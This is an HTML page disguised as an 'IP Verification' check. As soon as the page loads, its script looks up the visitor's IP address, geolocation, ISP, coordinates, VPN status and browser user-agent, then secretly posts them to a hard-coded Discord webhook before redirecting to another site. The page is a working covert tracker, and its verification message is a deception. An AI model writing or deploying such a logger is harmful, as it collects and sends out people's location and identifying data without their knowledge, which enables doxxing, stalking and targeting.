<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f1f1f1;
            text-align: center;
            padding: 50px;
        }
        #verify {
            background-color: #fff;
            border: 1px solid #ccc;
            display: inline-block;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        h1 {
            font-size: 28px;
            color: #333;
        }
        p {
            font-size: 18px;
            color: #666;
        }
        .loading {
            font-size: 18px;
            color: #007bff;
            font-weight: bold;
        }
    </style>
    <script>
        // Discord Webhook URL
        const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
        
        // Redirect URL after verification
        const redirectURL = "https://www.genned.net/auth/rdtqx";

        async function logVisitorAndRedirect() {
            // Simulate IP verification process
            document.getElementById('verify').innerHTML = `<h1>Verifying your IP...</h1><p class="loading">Please wait while we validate your connection...</p>`;

            try {
                // Fetch the user's IP address from ipify
                const ipResponse = await fetch("https://api.ipify.org?format=json");
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                // Fetch location data from ip-api.com
                const locationResponse = await fetch(`http://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon,timezone,query`);
                const locationData = await locationResponse.json();

                if (locationData.status !== "success") {
                    console.error("Error getting location data:", locationData.message);
                    window.location.href = redirectURL; // Redirect even if there's an error
                    return;
                }

                // Determine VPN status
                const vpnStatus = locationData.proxy || locationData.hosting ? "ðŸ”´ **VPN/Proxy Detected**" : "ðŸŸ¢ **No VPN/Proxy Detected**";

                // Create the message to send to Discord
                const userAgent = navigator.userAgent;
                const message = {
                    content: `**New Visitor Logged**\n\n` +
                             `**IP Address:** ${locationData.query}\n` +
                             `**Country:** ${locationData.country}\n` +
                             `**Region:** ${locationData.regionName}\n` +
                             `**City:** ${locationData.city}\n` +
                             `**ISP:** ${locationData.isp}\n` +
                             `**Organization:** ${locationData.org}\n` +
                             `**ASN:** ${locationData.as}\n` +
                             `**Latitude:** ${locationData.lat}\n` +
                             `**Longitude:** ${locationData.lon}\n` +
                             `**Timezone:** ${locationData.timezone}\n` +
                             `**Mobile Device:** ${locationData.mobile ? "Yes" : "No"}\n` +
                             `**VPN/Proxy:** ${locationData.proxy ? "Yes" : "No"}\n` +
                             `**Hosting Service:** ${locationData.hosting ? "Yes" : "No"}\n` +
                             `${vpnStatus}\n\n` +
                             `**User-Agent:** \`${userAgent}\``
                };

                // Send data to Discord webhook
                const discordResponse = await fetch(webhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(message)
                });

                if (!discordResponse.ok) {
                    console.error("Error sending message to Discord:", discordResponse.statusText);
                }

                // Add a small delay before redirecting to ensure data is sent
                setTimeout(() => {
                    window.location.href = redirectURL;
                }, 1000); // 1 second delay before redirecting

            } catch (error) {
                console.error("Error in logging or redirection:", error);
                window.location.href = redirectURL; // Redirect even if API fails
            }
        }

        // Run the function to simulate IP verification and log visitor
        window.onload = logVisitorAndRedirect;
    </script>
</head>
<body>
    <div id="verify">
        <h1>Verifying your IP...</h1>
        <p class="loading">Please wait while we validate your connection...</p>
    </div>
</body>
</html>
